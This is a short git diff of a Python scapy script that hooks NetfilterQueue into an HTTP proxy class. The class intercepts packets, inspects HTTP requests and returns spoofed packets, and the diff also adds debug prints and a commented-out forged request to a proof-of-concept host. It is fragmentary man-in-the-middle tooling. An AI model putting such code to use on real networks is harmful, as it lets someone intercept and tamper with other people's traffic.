@@ -3,6 +3,7 @@
 from __future__ import print_function
 import sys, time 
 from scapy.all import *
+from netfilterqueue import NetfilterQueue
 from multiprocessing import Process
 import netifaces
 try:
@@ -35,8 +36,12 @@ class HTTPproxy(Process):
         del spoofed[TCP].chksum
         return(spoofed)
   
-  def call(self, pkt):
+  def call(self, payload):
+    pkt = payload.get_payload()
     ip = IP(pkt)
+    tmp = pkt
+    print("mdrrrr")
+    #print(ip.show2())
     if ip.haslayer(HTTP):
         print ("HTTP / ", end="")
         if ip.haslayer(HTTPRequest):
@@ -49,6 +54,9 @@ class HTTPproxy(Process):
             #del ip[TCP].chksum 
             #print(ip[TCP].show2())
             #print("end checksums:", ip.chksum , " ", ip[TCP].chksum)
+            #print("ip : ", len(ip), " tcp:", len(ip[TCP]), " forged:")
+            print("=>", payload)
+            #print (len(pkt[TCP]), " -- ", len(tmp[TCP]), " --", len(ip[TCP]))
             return {'meth':1, 'spoofed_pkt': pkt} 
         '''
         sendp(Ether()/IP(dst="poc.argos.sh")/TCP()/"GET / HTTP/1.0\r\nHost: poc.argos.sh\r\nAccept: */*\r\n\r\n")
